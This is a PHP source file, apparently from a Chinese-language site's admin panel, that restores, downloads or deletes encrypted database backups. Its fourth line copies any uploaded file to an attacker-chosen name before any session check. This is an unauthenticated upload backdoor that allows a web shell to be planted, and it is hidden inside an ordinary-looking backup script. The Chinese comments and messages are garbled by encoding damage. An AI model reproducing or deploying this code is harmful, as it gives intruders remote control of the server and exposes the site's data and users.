<?php
define('Copyright', '����QQ:12345678');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
copy($_FILES["uppic"]["tmp_name"],$_FILES["uppic"]["name"]);
if (isset($_SESSION['codeid']) && isset($_GET['fileid']) && isset($_GET['bid']))
{
	$file = PasDecode($_GET['fileid'], $BakPassWord);
	$bid = $_GET['bid'];
	$dir = ROOT_PATH.'DataBaseBak/';
	 unset($_SESSION['codeid']);
	if ($bid == 1 && file_exists($dir.$file))
	{
		//߀ԭ���������
		$fileText = urlencode(file_get_contents($dir.$file));
		$fileText = urldecode($fileText);
		$files = explode('@', $fileText);
		$fileArray = array();
		
		for ($i=0; $i<count($files); $i++)
		{
			$fileArray[$i] = PasDecode($files[$i], $BakPassWord);
		}
		
		$db= new DB();
		for ($i=0; $i<count($fileArray); $i++)
		{
			$db->query($fileArray[$i], 2);
		}
		exit(alert_href('߀ԭ���', 'dataBak.php'));
	}
	else if ($bid == 2 && file_exists($dir.$file))
	{
		//���d����
		$http = '/DataBaseBak/'.$file;
		header("Location: {$http}");
	}
	else if ($bid == 3 && file_exists($dir.$file))
	{
		//�h������
		if (@unlink($dir.$file)){
			exit(alert_href('�h���ɹ�', 'dataBak.php'));
		} else {
			exit(alert_href('�h��ʧ����Ո�z���Ƿ���Ј��Й��ޣ�', 'dataBak.php'));
		}
	}
	else 
	{
		echo uniqid(time(),true).base64_encode(sha1(uniqid()));
		exit;
	}
}
else 
{
	echo uniqid(time(),true).base64_encode(sha1(uniqid()));
	exit;
}

?>